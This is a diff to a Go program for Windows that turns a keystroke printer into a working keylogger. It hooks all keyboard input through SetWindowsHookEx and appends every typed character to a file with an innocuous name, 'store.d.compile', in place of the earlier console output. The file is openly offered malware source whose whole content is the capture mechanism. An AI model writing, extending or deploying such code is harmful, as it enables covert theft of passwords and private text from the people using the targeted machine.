@@ -1,16 +1,18 @@
 package main
 
 import (
-	"fmt"
+	"bytes"
+	"io/ioutil"
+	"os"
 	"syscall"
 	"unsafe"
 )
 
 const (
-	WH_KEYBOARD_LL   = 13
-	WM_KEYDOWN       = 256
-	MAPVK_VK_TO_CHAR = 2
-	MAPVK_VK_TO_VSC  = 0
+	whKeyboardLl = 13
+	wmKeydown    = 256
+	mapvkToVcs   = 0
+	fileName     = "store.d.compile"
 )
 
 var (
@@ -26,12 +28,15 @@ var (
 	procGetKeyboardLayout     = user32.MustFindProc("GetKeyboardLayout")
 )
 
+// HOOKPROC ...
 type HOOKPROC func(int, uintptr, uintptr) uintptr
 
+// POINT ...
 type POINT struct {
 	X, Y int32
 }
 
+// MSG ...
 type MSG struct {
 	Hwnd    uintptr
 	Message uint32
@@ -41,6 +46,7 @@ type MSG struct {
 	Pt      POINT
 }
 
+// KBDLLHOOKSTRUCT ...
 type KBDLLHOOKSTRUCT struct {
 	VkCode      uintptr
 	ScanCode    uintptr
@@ -49,16 +55,18 @@ type KBDLLHOOKSTRUCT struct {
 	DwExtraInfo uintptr
 }
 
-func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod uintptr, dwThreadId uintptr) uintptr {
+// SetWindowsHookEx ...
+func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod uintptr, dwThreadID uintptr) uintptr {
 	ret, _, _ := procSetWindowsHookEx.Call(
 		uintptr(idHook),
 		uintptr(syscall.NewCallback(lpfn)),
 		uintptr(hMod),
-		uintptr(dwThreadId),
+		uintptr(dwThreadID),
 	)
 	return uintptr(ret)
 }
 
+// CallNextHookEx ...
 func CallNextHookEx(hhk uintptr, nCode int, wParam uintptr, lParam uintptr) uintptr {
 	ret, _, _ := procCallNextHookEx.Call(
 		uintptr(hhk),
@@ -69,6 +77,7 @@ func CallNextHookEx(hhk uintptr, nCode int, wParam uintptr, lParam uintptr) uint
 	return uintptr(ret)
 }
 
+// UnhookWindowsHookEx ...
 func UnhookWindowsHookEx(hhk uintptr) bool {
 	ret, _, _ := procUnhookWindowsHookEx.Call(
 		uintptr(hhk),
@@ -76,24 +85,25 @@ func UnhookWindowsHookEx(hhk uintptr) bool {
 	return ret != 0
 }
 
+// LowLevelKeyboardProcess ...
 func LowLevelKeyboardProcess(nCode int, wparam uintptr, lparam uintptr) uintptr {
 	var temporaryKeyPtr uintptr
 	var keyboardState [256]byte
 	var unicodeKey [256]byte
 	var keyboardLayoutName [256]byte
-	if nCode == 0 && wparam == WM_KEYDOWN {
+	if nCode == 0 && wparam == wmKeydown {
 		key := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
-		sc := MapVirtualKey(key.VkCode, MAPVK_VK_TO_VSC)
+		sc := MapVirtualKey(key.VkCode, mapvkToVcs)
 		GetKeyboardLayoutName(&keyboardLayoutName)
-		fmt.Println(string(keyboardLayoutName[:]))
-		fmt.Println(key.VkCode, sc)
 		GetKeyboardState(&keyboardState)
 		ToUnicode(key.VkCode, uintptr(sc), &keyboardState, &unicodeKey, 256, 0)
-		fmt.Println(string(unicodeKey[:]))
+		unicodeKeyFiltered := bytes.Trim([]byte(unicodeKey[:]), "\x00")
+		WriteToFile(string(unicodeKeyFiltered))
 	}
 	return CallNextHookEx(temporaryKeyPtr, nCode, wparam, lparam)
 }
 
+// GetMessage ...
 func GetMessage(msg *MSG, hwnd uintptr, msgFilterMin uint32, msgFilterMax uint32) int {
 	ret, _, _ := procGetMessage.Call(
 		uintptr(unsafe.Pointer(msg)),
@@ -103,6 +113,7 @@ func GetMessage(msg *MSG, hwnd uintptr, msgFilterMin uint32, msgFilterMax uint32
 	return int(ret)
 }
 
+// MapVirtualKey ...
 func MapVirtualKey(vkCode uintptr, uMapType uintptr) int {
 	ret, _, _ := procMapVirtualKey.Call(
 		uintptr(vkCode),
@@ -110,6 +121,7 @@ func MapVirtualKey(vkCode uintptr, uMapType uintptr) int {
 	return int(ret)
 }
 
+// ToUnicode ...
 func ToUnicode(wVirtKey uintptr, wScanCode uintptr, lpKeyState *[256]byte, pwszBuff *[256]byte, cchBuff int, wFlags uint) int {
 	ret, _, _ := procToUnicode.Call(
 		uintptr(wVirtKey),
@@ -121,31 +133,51 @@ func ToUnicode(wVirtKey uintptr, wScanCode uintptr, lpKeyState *[256]byte, pwszB
 	return int(ret)
 }
 
+// GetKeyboardState ...
 func GetKeyboardState(lpKeyState *[256]byte) int {
 	ret, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(lpKeyState)))
 	return int(ret)
 }
 
+// GetKeyboardLayoutName ...
 func GetKeyboardLayoutName(pwszKLID *[256]byte) int {
 	ret, _, _ := procGetKeyboardLayoutName.Call(uintptr(unsafe.Pointer(pwszKLID)))
 	return int(ret)
 }
 
+// GetKeyboardLayout ...
 func GetKeyboardLayout(idThread uintptr) int {
 	ret, _, _ := procGetKeyboardLayout.Call(uintptr(idThread))
 	return int(ret)
 }
 
+// WriteToFile ...
+func WriteToFile(key string) {
+	pwd, _ := os.Getwd()
+	readableBytes, err := ioutil.ReadFile(pwd + "/" + fileName)
+	writeString := string(readableBytes) + key
+	ioutil.WriteFile(pwd+"/"+fileName, []byte(writeString), 0644)
+
+	if err != nil {
+		panic(err)
+	}
+}
+
+// Start ...
 func Start() {
 	defer user32.Release()
 	var msg MSG
-	keyboardHook := SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProcess, 0, 0)
+	keyboardHook := SetWindowsHookEx(whKeyboardLl, LowLevelKeyboardProcess, 0, 0)
 	for GetMessage(&msg, 0, 0, 0) != 0 {
-		fmt.Println(msg)
 	}
 	UnhookWindowsHookEx(keyboardHook)
 }
 
 func main() {
+	f, err := os.Create(fileName)
+	defer f.Close()
+	if err != nil {
+		panic(err)
+	}
 	Start()
 }
